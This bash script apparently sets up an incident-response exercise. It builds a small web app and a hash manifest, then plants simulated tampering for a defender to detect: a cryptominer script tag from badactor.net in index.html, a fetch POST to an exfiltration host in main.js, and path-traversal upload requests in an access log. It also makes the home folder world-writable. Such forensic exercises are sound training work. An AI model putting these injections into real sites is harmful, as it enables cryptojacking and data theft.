#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip coreutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/app /home/user/logs

    # Create original files
    cat << 'EOF' > /home/user/app/index.html
<!DOCTYPE html>
<html>
<head><title>App</title></head>
<body><h1>Welcome</h1></body>
</html>
EOF

    cat << 'EOF' > /home/user/app/main.js
console.log("App started");
EOF

    cat << 'EOF' > /home/user/app/utils.py
def helper():
    return "help"
EOF

    # Generate manifest
    cd /home/user/app && sha256sum * > /home/user/app_manifest.sha256
    sed -i 's|  |  /home/user/app/|g' /home/user/app_manifest.sha256
    cd /home/user

    # Simulate attacker altering files
    cat << 'EOF' > /home/user/app/index.html
<!DOCTYPE html>
<html>
<head><title>App</title>
<script src="https://crypto-miner.badactor.net/miner.js"></script>
</head>
<body><h1>Welcome</h1></body>
</html>
EOF

    cat << 'EOF' > /home/user/app/main.js
console.log("App started");
fetch("https://exfil.stealdata.org/keys", {method: "POST"});
EOF

    # Create access logs
    cat << 'EOF' > /home/user/logs/access.log
192.168.1.15 - - [10/Oct/2023:13:55:36 +0000] "GET / HTTP/1.1" 200 1024
203.0.113.50 - - [10/Oct/2023:13:56:01 +0000] "POST /upload HTTP/1.1" 200 512
198.51.100.77 - - [10/Oct/2023:14:01:12 +0000] "POST /upload?file=../../../home/user/app/index.html HTTP/1.1" 200 23
198.51.100.77 - - [10/Oct/2023:14:01:15 +0000] "POST /upload?file=../../../home/user/app/main.js HTTP/1.1" 200 45
10.0.0.5 - - [10/Oct/2023:14:05:00 +0000] "GET /app/main.js HTTP/1.1" 200 128
EOF

    chown -R user:user /home/user/app /home/user/logs /home/user/app_manifest.sha256
    chmod -R 777 /home/user
